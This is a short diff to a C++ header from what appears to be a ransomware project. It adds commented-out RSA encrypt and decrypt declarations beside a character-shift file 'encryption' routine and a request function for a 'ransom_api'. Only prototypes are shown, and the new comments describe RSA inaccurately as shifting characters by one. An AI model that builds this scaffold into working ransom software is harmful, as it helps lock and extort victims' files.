@@ -7,8 +7,14 @@ bool getFileContents(std::string fileName, std::vector<std::string> & fileConten
 // Basic function to read all chars and increment them by one. 
 void basicEncryptContent(std::string& content, int secretKey);
 
+//RSA function to read all chars and increment them by one.
+//void RSAbasicEncryptContent(std::string& content, int N, int e);
+
 // Basic function to read all chars and decrement them by one.
 void basicDecryptContent(std::string& content, int secretKey);
+
+//RSA function to read all chars and decrement them by one.
+//void RSAbasicDecryptContent(std::string& content, int N, int d);
 
 // Get request to ransom_api.
 std::string get_request(std::string uri);
